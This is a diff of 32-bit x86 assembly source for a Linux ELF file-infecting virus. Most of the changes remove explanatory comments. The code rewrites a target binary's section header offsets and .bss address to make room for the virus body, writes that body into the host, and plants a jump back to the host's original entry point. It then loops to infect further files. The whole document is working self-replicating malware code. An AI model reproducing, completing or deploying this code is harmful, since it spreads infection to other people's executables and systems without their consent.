@@ -222,62 +222,44 @@ program_header_loop:
 
     xor ecx, ecx
     xor eax, eax
-    mov cx, word [edi+2080+48]      ; ehdr->shnum (number of section header entries)
-    mov eax, dword [edi+2080+32]    ; ehdr->shoff (section header offset)
-    sub ax, word [edi+2080+46]      ; subtract 40 (size of section header entry) to initialize loop
+    mov cx, word [edi+2080+48]      ; number of section header entries
+    mov eax, dword [edi+2080+32]    ; section header offset
+    sub ax, word [edi+2080+46]      ; size of section header entry
 
 section_header_loop:
-    ; loop through section headers and find the .bss section (NOBITS)
+    ; find the .bss section in section headers (NOBITS)
 
-    ;0	sh_name	contains a pointer to the name string section giving the
-    ;+4	sh_type	give the section type [name of this section
-    ;+8	sh_flags	some other flags ...
-    ;+c	sh_addr	virtual addr of the section while running
-    ;+10	sh_offset	offset of the section in the file
-    ;+14	sh_size	zara white phone numba
-    ;+18	sh_link	his use depends on the section type
-    ;+1c	sh_info	depends on the section type
-    ;+20	sh_addralign	alignement
-    ;+24	sh_entsize	used when section contains fixed size entrys
     add ax, word [edi+2080+46]
     cmp ecx, 0
-    jbe finish_infection        ; couldn't find .bss section.  Nothing to worry about.  Finish the infection
-    sub ecx, 1                  ; decrement our counter by 1
+    jbe finish_infection                ; .bss section not found
+    sub ecx, 1
 
     mov ebx, dword [edi+2080+eax+4]     ; shdr->type (type of section)
-    cmp ebx, 0x00000008         ; 0x08 is NOBITS which is an indicator of a .bss section
-    jne section_header_loop     ; it's not the .bss section
+    cmp ebx, 0x00000008                 ; 0x08 is NOBITS which is an indicator of a .bss section
+    jne section_header_loop
 
-    mov ebx, dword [edi+2080+eax+12]    ; shdr->addr (virtual address in memory)
-    add ebx, v_stop - v_start   ; add size of our virus to shdr->addr
-    add ebx, 7                  ; for the jmp to original entry point
-    mov [edi+2080+eax+12], ebx  ; overwrite the old shdr->addr with the new one (in buffer)
+    mov ebx, dword [edi+2080+eax+12]    ;virtual address in memory
+    add ebx, v_stop - v_start
+    add ebx, 7
+    mov [edi+2080+eax+12], ebx          ; overwrite addr of .bss section
 
 section_header_loop_2:
-    mov edx, dword [edi+2080+eax+16]    ; shdr->offset (offset of section)
-    add edx, v_stop - v_start   ; add size of our virus to shdr->offset
-    add edx, 7                  ; for the jmp to original entry point
-    mov [edi+2080+eax+16], edx  ; overwrite the old shdr->offset with the new one (in buffer)
+    mov edx, dword [edi+2080+eax+16]    ; offset of section
+    add edx, v_stop - v_start
+    add edx, 7
+    mov [edi+2080+eax+16], edx
 
     add eax, 40
     sub ecx, 1
     cmp ecx, 0
-    jg section_header_loop_2    ; this loop isn't necessary to make the virus function, but inspecting the host file with a readelf -a shows a clobbered symbol table and section/segment mapping
+    jg section_header_loop_2
 
 finish_infection:
-    ;dword [edi+2080+24]       ; ehdr->entry (virtual address of entry point)
-    ;dword [edi+2080+28]       ; ehdr->phoff (program header offset)
-    ;dword [edi+2080+32]       ; ehdr->shoff (section header offset)
-    ;word [edi+2080+40]        ; ehdr->ehsize (size of elf header)
-    ;word [edi+2080+42]        ; ehdr->phentsize (size of one program header entry)
-    ;word [edi+2080+44]        ; ehdr->phnum (number of program header entries)
-    ;word [edi+2080+46]        ; ehdr->shentsize (size of one section header entry)
-    ;word [edi+2080+48]        ; ehdr->shnum (number of program header entries)
-    mov eax, v_stop - v_start       ; size of our virus minus the jump to original entry point
-    add eax, 7                      ; for the jmp to original entry point
+    mov eax, v_stop - v_start
+    add eax, 7
     mov ebx, dword [edi+2080+32]    ; the original section header offset
     add eax, ebx                    ; add the original section header offset
-    mov [edi+2080+32], eax      ; overwrite the old section header offset with the new one (in buffer)
+    mov [edi+2080+32], eax          ; overwrite the old section header offset with the new one (in buffer)
 
     mov eax, 5              ; sys_open
     mov ebx, edi            ; path
@@ -296,7 +278,7 @@ finish_infection:
 
     call delta_offset
 delta_offset:
-    pop ebp                 ; we need to calculate our delta offset because the absolute address of v_start will differ in different host files.  This will be 0 in our original virus
+    pop ebp
     sub ebp, delta_offset
 
     mov eax, 4
@@ -304,7 +286,7 @@ delta_offset:
     mov edx, v_stop - v_start   ; size of virus bytes
     int 80h
 
-    pop edx                 ; original entry point of host (we'll store this double word in the same location we used for the 32 byte filename)
+    pop edx                     ; original entry point of host
     mov [edi], byte 0xb8        ; op code for MOV EAX (1 byte)
     mov [edi+1], edx            ; original entry point (4 bytes)
     mov [edi+5], word 0xe0ff    ; op code for JMP EAX (2 bytes)
@@ -316,9 +298,9 @@ delta_offset:
 
     mov eax, 4              ; sys_write
     mov ecx, edi
-    add ecx, 2080           ; offset to targetfile in fake .bss
+    add ecx, 2080 
     mov edx, dword [edi+7]  ; offset of the virus
-    add ecx, edx            ; let's continue where we left off
+    add ecx, edx 
 
     pop edx                 ; offset of last byte in targetfile in fake.bss
     sub edx, ecx            ; length of bytes to write
@@ -333,7 +315,6 @@ delta_offset:
     jmp infect
 
 v_stop:
-    ; virus body stop (host program start)
-    mov eax, 1      ; sys_exit
-    mov ebx, 0      ; normal status
+    mov eax, 1
+    mov ebx, 0
     int 80h
